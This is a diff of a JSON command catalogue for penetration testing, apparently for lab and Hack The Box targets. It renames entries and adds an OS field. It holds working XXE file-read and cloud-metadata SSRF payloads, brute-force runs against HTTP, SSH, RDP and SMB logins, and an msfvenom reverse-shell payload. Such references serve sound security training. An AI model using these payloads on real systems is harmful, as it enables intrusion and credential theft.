+      "OS": "Linux"
     },
     {
-      "Name": "Xnest Setup",
+      "Name": "Start Xnest Server",
       "Category": 10,
       "Description": "Starts an X-Server to catch incoming xterm on port 6001 (run on your system) checkout https://www.revshells.com for more robust shell creation",
-      "Command": "Xnest :1"
+      "Command": "Xnest :1",
+      "OS": "Linux"
     },
     {
-      "Name": "Xhost Authorization",
+      "Name": "Authorize Xhost Target",
       "Category": 10,
       "Description": "Authorizes the target to connect to your X-Server (run on your system)",
-      "Command": "xhost +targetip"
+      "Command": "xhost +targetip",
+      "OS": "Linux"
     },
     {
-      "Name": "Shodan",
+      "Name": "Search Shodan Queries",
       "Category": 0,
       "Description": "Search for company name and variations to look for nonstandard ports and outdated services",
-      "Command": "https://www.shodan.io/"
+      "Command": "https://www.shodan.io/",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "sub3num",
+      "Name": "Enum Subdomains Sub3num",
       "Category": 0,
       "Description": "Tool for subdomain enumeration https://github.com/saharshtapi/sub3num",
-      "Command": "./sub3num <target_domain>"
+      "Command": "./sub3num <target_domain>",
+      "OS": "Linux"
     },
     {
-      "Name": "subfinder",
+      "Name": "Discover Subdomains Subfinder",
       "Category": 0,
       "Description": "Tool for discovering subdomains https://github.com/projectdiscovery/subfinder",
-      "Command": "subfinder -d <target_domain>"
+      "Command": "subfinder -d <target_domain>",
+      "OS": "Linux"
     },
     {
-      "Name": "reconng",
+      "Name": "Run Recon-NG",
       "Category": 0,
       "Description": "Tool for reconnaissance https://github.com/lanmaster53/recon-ng",
-      "Command": "reconng"
+      "Command": "reconng",
+      "OS": "Linux"
     },
     {
-      "Name": "GrayHat Warfare",
+      "Name": "Search Cloud Buckets",
       "Category": 0,
       "Description": "Look for cloud buckets by company names and variations with bucket keywords",
-      "Command": "https://grayhatwarfare.com/"
+      "Command": "https://grayhatwarfare.com/",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "XXE",
+      "Name": "Test XXE Payload",
       "Category": 2,
       "Description": "Test for XML External Entity vulnerabilities",
-      "Command": "<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\"> ]> <vulnfield>$ent</vulnfield>"
+      "Command": "<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\"> ]> <vulnfield>$ent</vulnfield>",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "XXE with SSRF",
+      "Name": "XXE SSRF Payload",
       "Category": 2,
       "Description": "Retrieve data from internal EC2 instance using SSRF",
-      "Command": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin\"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>"
+      "Command": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin\"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "XXE Without Full Control",
+      "Name": "Partial XXE Payload",
       "Category": 2,
       "Description": "Include XXE in vulnerable field without full document control",
-      "Command": "productId=1<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>&storeId=2"
+      "Command": "productId=1<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>&storeId=2",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "XXE Embedded in Image",
+      "Name": "SVG XXE Payload",
       "Category": 2,
       "Description": "Embed XXE in an SVG image",
-      "Command": "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]><svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"><text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text></svg>"
+      "Command": "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]><svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"><text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text></svg>",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "gobuster",
+      "Name": "Dir Bust Gobuster",
       "Category": 3,
       "Description": "Directory busting tool",
-      "Command": "gobuster dir -u http://10.10.10.5 -w /usr/share/wfuzz/wordlist/general/megabeast.txt -o gobuster_results.txt"
+      "Command": "gobuster dir -u http://10.10.10.5 -w /usr/share/wfuzz/wordlist/general/megabeast.txt -o gobuster_results.txt",
+      "OS": "Linux"
     },
     {
-      "Name": "ffuf",
+      "Name": "Dir Bust FFUF",
       "Category": 3,
       "Description": "Directory busting with ffuf",
-      "Command": "ffuf -u http://hostmaster.ghost.htb/FUZZ -w /usr/share/wordlists/wfuzz/general/megabeast.txt -mc 200,301,302"
+      "Command": "ffuf -u http://hostmaster.ghost.htb/FUZZ -w /usr/share/wordlists/wfuzz/general/megabeast.txt -mc 200,301,302",
+      "OS": "Linux"
     },
     {
-      "Name": "wfuzz",
+      "Name": "Dir Bust Wfuzz",
       "Category": 3,
       "Description": "Directory busting with wfuzz",
-      "Command": "wfuzz -c -z file,/path/to/wordlist.txt --hc 404 http://target-site/FUZZ"
+      "Command": "wfuzz -c -z file,/path/to/wordlist.txt --hc 404 http://target-site/FUZZ",
+      "OS": "Linux"
     },
     {
-      "Name": "wfuzz",
+      "Name": "File Bust Wfuzz",
       "Category": 3,
       "Description": "File busting with extensions",
-      "Command": "wfuzz -c -z file,/path/to/wordlist.txt -z list,pdf,xls,txt,doc --hc 404 http://target-site/FUZZ.FUZ2Z"
+      "Command": "wfuzz -c -z file,/path/to/wordlist.txt -z list,pdf,xls,txt,doc --hc 404 http://target-site/FUZZ.FUZ2Z",
+      "OS": "Linux"
     },
     {
-      "Name": "nmap",
+      "Name": "Scan Open Ports",
       "Category": 3,
       "Description": "Scan for open ports",
-      "Command": "nmap -p- --open 10.10.10.11"
+      "Command": "nmap -p- --open 10.10.10.11",
+      "OS": "Linux"
     },
     {
-      "Name": "gobuster File",
+      "Name": "File Bust Gobuster",
       "Category": 3,
       "Description": "File busting with gobuster",
-      "Command": "gobuster dir -u http://target-site.com -w /path/to/wordlist.txt -x php,json"
+      "Command": "gobuster dir -u http://target-site.com -w /path/to/wordlist.txt -x php,json",
+      "OS": "Linux"
     },
     {
-      "Name": "wfuzz File",
+      "Name": "File Bust Wfuzz Extensions",
       "Category": 3,
       "Description": "File busting with wfuzz",
-      "Command": "wfuzz -c -z file,/path/to/wordlist.txt --hc 404 http://target-site.com/FUZZ.{php,json}"
+      "Command": "wfuzz -c -z file,/path/to/wordlist.txt --hc 404 http://target-site.com/FUZZ.{php,json}",
+      "OS": "Linux"
     },
     {
-      "Name": "ffuf File",
+      "Name": "File Bust FFUF",
       "Category": 3,
       "Description": "File busting with ffuf",
-      "Command": "ffuf -u http://target-site.com/FUZZ -w /path/to/wordlist.txt -e php,json -mc 200"
+      "Command": "ffuf -u http://target-site.com/FUZZ -w /path/to/wordlist.txt -e php,json -mc 200",
+      "OS": "Linux"
     },
     {
-      "Name": "hydra",
+      "Name": "Brute HTTP Login",
       "Category": 4,
       "Description": "Brute force login attempts",
-      "Command": "hydra -l tyler -P /usr/share/wordlists/rockyou.txt 10.10.10.97 http-post-form \"/login.php:username=^USER^&password=^PASS^:F=valid\""
+      "Command": "hydra -l tyler -P /usr/share/wordlists/rockyou.txt 10.10.10.97 http-post-form \"/login.php:username=^USER^&password=^PASS^:F=valid\"",
+      "OS": "Linux"
     },
     {
-      "Name": "hydra",
+      "Name": "Brute SSH Login",
       "Category": 4,
       "Description": "Brute force ssh with a wordlist",
-      "Command": "hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201"
+      "Command": "hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201",
+      "OS": "Linux"
     },
     {
-      "Name": "hydra",
+      "Name": "Brute RDP Login",
       "Category": 4,
       "Description": "Brute force rdp with a wordlist",
-      "Command": "hydra -l 'daniel' -P /usr/share/wordlists/rockyou.txt rdp://192.168.213.202"
+      "Command": "hydra -l 'daniel' -P /usr/share/wordlists/rockyou.txt rdp://192.168.213.202",
+      "OS": "Linux"
     },
     {
-      "Name": "nxc",
+      "Name": "Brute RDP NXC",
       "Category": 4,
       "Description": "Brute force rdp with a wordlist using nxc",
-      "Command": "nxc rdp 192.168.XXX.227 -u nadine -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding"
+      "Command": "nxc rdp 192.168.XXX.227 -u nadine -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding",
+      "OS": "Linux"
     },
     {
-      "Name": "hydra",
+      "Name": "Brute Basic Auth",
       "Category": 4,
       "Description": "Brute force basic auth with a wordlist",
-      "Command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.213.201 http-get"
+      "Command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.213.201 http-get",
+      "OS": "Linux"
     },
     {
-      "Name": "ffuf Brute",
+      "Name": "Brute FFUF POST",
       "Category": 4,
       "Description": "Brute force with ffuf",
-      "Command": "ffuf -w /usr/share/wordlists/rockyou.txt:FUZZ -u \"http://10.10.11.24:8008/ghost/api/admin/session\" -X POST -d '{\"username\":\"htbuserFUZZ\",\"password\":\"secret\"}' -H \"Host: 10.10.11.24:8008\" -H \"Accept: text/plain, */*; q=0.01\" -H \"X-Forwarded-For: htbuserFUZZ\" -H \"X-Requested-With: XMLHttpRequest\" -H \"X-Ghost-Version: 5.78\" -H \"App-Pragma: no-cache\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36\" -H \"Content-Type: application/json;charset=UTF-8\" -H \"Origin: http://10.10.11.24:8008\" -H \"Referer: http://10.10.11.24:8008/ghost/\" -H \"Accept-Encoding: gzip, deflate, br\" -H \"Accept-Language: en-US,en;q=0.9\" -H \"Cookie: connect.sid=s%3Av28_oZV8lijLRwlgUQWxt6ccnksDKouo.sb4qxncwYoE0dnj3ARiTb8OnJitRF%2FvDttKjE0nSX%2FM\" -H \"Connection: close\" -mr \"There is no user with that email address.\""
+      "Command": "ffuf -w /usr/share/wordlists/rockyou.txt:FUZZ -u \"http://10.10.11.24:8008/ghost/api/admin/session\" -X POST -d '{\"username\":\"htbuserFUZZ\",\"password\":\"secret\"}' -H \"Host: 10.10.11.24:8008\" -H \"Accept: text/plain, */*; q=0.01\" -H \"X-Forwarded-For: htbuserFUZZ\" -H \"X-Requested-With: XMLHttpRequest\" -H \"X-Ghost-Version: 5.78\" -H \"App-Pragma: no-cache\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36\" -H \"Content-Type: application/json;charset=UTF-8\" -H \"Origin: http://10.10.11.24:8008\" -H \"Referer: http://10.10.11.24:8008/ghost/\" -H \"Accept-Encoding: gzip, deflate, br\" -H \"Accept-Language: en-US,en;q=0.9\" -H \"Cookie: connect.sid=s%3Av28_oZV8lijLRwlgUQWxt6ccnksDKouo.sb4qxncwYoE0dnj3ARiTb8OnJitRF%2FvDttKjE0nSX%2FM\" -H \"Connection: close\" -mr \"There is no user with that email address.\"",
+      "OS": "Linux"
     },
     {
-      "Name": "wfuzz Brute",
+      "Name": "Brute Wfuzz POST",
       "Category": 4,
       "Description": "Brute force with wfuzz",
-      "Command": "wfuzz -z range,1-100000 -d \"username=htbuserFUZZ&password=secret\" -H \"X-Forwarded-For: htbuserFUZZ\" --hs \"There is no user with that email address.\" -u \"http://10.10.11.24:8008/ghost/api/admin/session\""
+      "Command": "wfuzz -z range,1-100000 -d \"username=htbuserFUZZ&password=secret\" -H \"X-Forwarded-For: htbuserFUZZ\" --hs \"There is no user with that email address.\" -u \"http://10.10.11.24:8008/ghost/api/admin/session\"",
+      "OS": "Linux"
     },
     {
-      "Name": "nikto",
+      "Name": "Scan Web Vulns Nikto",
       "Category": 5,
       "Description": "Vulnerability scanning with nikto",
-      "Command": "nikto -h http://targetip:targetport"
+      "Command": "nikto -h http://targetip:targetport",
+      "OS": "Linux"
     },
     {
-      "Name": "nmap Vuln",
+      "Name": "Run Nmap Vuln Scripts",
       "Category": 5,
       "Description": "Vulnerability scanning with nmap scripts",
-      "Command": "nmap --script-help=http* -v 10.10.10.11"
+      "Command": "nmap --script-help=http* -v 10.10.10.11",
+      "OS": "Linux"
     },
     {
-      "Name": "wpscan",
+      "Name": "Scan WordPress Vulns",
       "Category": 5,
       "Description": "WordPress security scanner",
-      "Command": "wpscan --url http://10.10.10.11/pathtowordpress/"
+      "Command": "wpscan --url http://10.10.10.11/pathtowordpress/",
+      "OS": "Linux"
     },
     {
-      "Name": "ffuf Subdomain",
+      "Name": "Enum Subdomains FFUF",
       "Category": 6,
       "Description": "Subdomain enumeration with ffuf",
-      "Command": "ffuf -u http://DOMAIN -w wordlist.txt -H \"Host: FUZZ.DOMAIN\" -s"
+      "Command": "ffuf -u http://DOMAIN -w wordlist.txt -H \"Host: FUZZ.DOMAIN\" -s",
+      "OS": "Linux"
     },
     {
-      "Name": "wfuzz Subdomain",
+      "Name": "Enum Subdomains Wfuzz",
       "Category": 6,
       "Description": "Subdomain enumeration with wfuzz",
-      "Command": "wfuzz -c -z file,/path/to/wordlist.txt -H \"Host: FUZZ.target-site.com\" --hw 0 http://target-site.com"
+      "Command": "wfuzz -c -z file,/path/to/wordlist.txt -H \"Host: FUZZ.target-site.com\" --hw 0 http://target-site.com",
+      "OS": "Linux"
     },
     {
-      "Name": "enum4linux",
+      "Name": "Run Enum4linux",
       "Category": 7,
       "Description": "SMB enumeration",
-      "Command": "enum4linux -a 10.10.11.24"
+      "Command": "enum4linux -a 10.10.11.24",
+      "OS": "Linux"
     },
     {
-      "Name": "smbclient",
+      "Name": "List SMB Shares",
       "Category": 7,
       "Description": "List SMB shares",
-      "Command": "smbclient -L \\\\10.10.11.24 -U anonymous"
+      "Command": "smbclient -L \\\\10.10.11.24 -U anonymous",
+      "OS": "Linux"
     },
     {
-      "Name": "nmap SMB",
+      "Name": "Scan SMB Vulns",
       "Category": 7,
       "Description": "SMB vulnerability scan",
-      "Command": "nmap --script smb-vuln* -p 445 10.10.11.24"
+      "Command": "nmap --script smb-vuln* -p 445 10.10.11.24",
+      "OS": "Linux"
     },
     {
-      "Name": "smbmap",
+      "Name": "Map SMB Shares",
       "Category": 7,
       "Description": "SMB share mapping",
-      "Command": "smbmap -H 10.10.11.24 -u guest -p \"\""
+      "Command": "smbmap -H 10.10.11.24 -u guest -p \"\"",
+      "OS": "Linux"
     },
     {
-      "Name": "medusa SMB",
+      "Name": "Brute SMB Medusa",
       "Category": 7,
       "Description": "Brute force SMB with medusa",
-      "Command": "medusa -h 10.10.11.24 -u administrator -P /usr/share/wordlists/rockyou.txt -M smbnt -F"
+      "Command": "medusa -h 10.10.11.24 -u administrator -P /usr/share/wordlists/rockyou.txt -M smbnt -F",
+      "OS": "Linux"
     },
     {
-      "Name": "hydra SMB",
+      "Name": "Brute SMB Hydra",
       "Category": 7,
       "Description": "Brute force SMB with hydra",
-      "Command": "hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt 10.10.11.24 smb"
+      "Command": "hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt 10.10.11.24 smb",
+      "OS": "Linux"
     },
     {
-      "Name": "ncrack SMB",
+      "Name": "Brute SMB Ncrack",
       "Category": 7,
       "Description": "Brute force SMB with ncrack",
-      "Command": "ncrack -p 445 -u blake -P /usr/share/wordlists/rockyou.txt smb://10.10.11.16"
+      "Command": "ncrack -p 445 -u blake -P /usr/share/wordlists/rockyou.txt smb://10.10.11.16",
+      "OS": "Linux"
     },
     {
-      "Name": "nmap RPC",
+      "Name": "Enum RPC Nmap",
       "Category": 7,
       "Description": "RPC enumeration with nmap",
-      "Command": "nmap -sS -sV -p 135,139,445 --script=rpc-enum* 10.10.11.2"
+      "Command": "nmap -sS -sV -p 135,139,445 --script=rpc-enum* 10.10.11.2",
+      "OS": "Linux"
     },
     {
-      "Name": "rpcclient",
+      "Name": "Connect RPC Client",
       "Category": 7,
       "Description": "RPC client enumeration",
-      "Command": "rpcclient -U \"\" 10.10.11.24"
+      "Command": "rpcclient -U \"\" 10.10.11.24",
+      "OS": "Linux"
     },
     {
-      "Name": "smtp-user-enum",
+      "Name": "Enum SMTP Users",
       "Category": 7,
       "Description": "SMTP user enumeration",
-      "Command": "smtp-user-enum -M VRFY -U /usr/share/wordlists/rockyou.txt -t 10.10.11.14"
+      "Command": "smtp-user-enum -M VRFY -U /usr/share/wordlists/rockyou.txt -t 10.10.11.14",
+      "OS": "Linux"
     },
     {
-      "Name": "medusa SMTP",
+      "Name": "Brute SMTP Medusa",
       "Category": 7,
       "Description": "Brute force SMTP with medusa",
-      "Command": "medusa -h target-server -u username -P /path/to/passwords.txt -M smtp -n 25"
+      "Command": "medusa -h target-server -u username -P /path/to/passwords.txt -M smtp -n 25",
+      "OS": "Linux"
     },
     {
-      "Name": "dig",
+      "Name": "Query DNS Records",
       "Category": 7,
       "Description": "DNS record lookup",
-      "Command": "dig <domain> -t any"
+      "Command": "dig <domain> -t any",
+      "OS": "Linux"
     },
     {
-      "Name": "msfvenom Windows",
+      "Name": "Generate Windows Payload",
       "Category": 8,
       "Description": "Generate Windows reverse shell payload",
-      "Command": "msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=443 -f aspx -o rshell443.aspx"
+      "Command": "msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=443 -f aspx -o rshell443.aspx",
+      "OS": "Linux"
     },
     {
-      "Name": "chisel",
+      "Name": "Setup Chisel Forward",
       "Category": 9,
       "Description": "Port forwarding with chisel",
-      "Command": "chisel server --port $PORT --proxy http://example.com"
+      "Command": "chisel server --port $PORT --proxy http://example.com",
+      "OS": "Win/Lin"
     }
   ]
 }
